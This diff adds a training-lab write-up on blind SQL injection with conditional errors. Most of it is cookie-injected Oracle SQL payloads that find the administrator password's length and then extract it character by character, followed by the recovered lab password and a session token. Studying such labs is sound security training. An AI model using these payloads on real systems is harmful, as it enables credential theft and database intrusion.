@@ -1,0 +1,30 @@
+Lab: Blind SQL injection with conditional errors
+
+Returned non-error result with following:
+Cookie: TrackingId=KlKIDd0JxrkSJMog' || (SELECT '' from dual) || ';
+
+
+Returns status code 200:
+Cookie: TrackingId=KlKIDd0JxrkSJMog' || (SELECT username from users WHERE username='administrator') || '
+
+
+Returns error when condition true, else returns status code 200:
+Cookie: TrackingId=KlKIDd0JxrkSJMog' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from dual) || '
+
+Now modify the above so that we can get more info about the password...
+
+Below returns error when true, 200 when false:
+Cookie: TrackingId=KlKIDd0JxrkSJMog' || (SELECT CASE WHEN ((SELECT username from users where username='administrator')='administrator') THEN TO_CHAR(1/0) ELSE '' END from dual) || '
+
+Get even more info...
+
+PIVOT FROM PREVIOUS SUBSTRING PLAN:
+
+Using similar request I found len(password) = 20:
+Cookie: TrackingId=7DqNBzZ8aYm4EOkp' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator' AND LENGTH(password) > 21) || ';
+
+Used this cookie to get password 1 char at a time. Use cluster bomb attack to get chars 1-20:
+Cookie: TrackingId=7DqNBzZ8aYm4EOkp' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator' AND SUBSTR(password, 1, 1) = 'a') || '; session=fmB1HkETAqYItXWu7W54fQtNhl6pto8j
+
+password:
+ojz6ze4gz9v1oj20t1ku
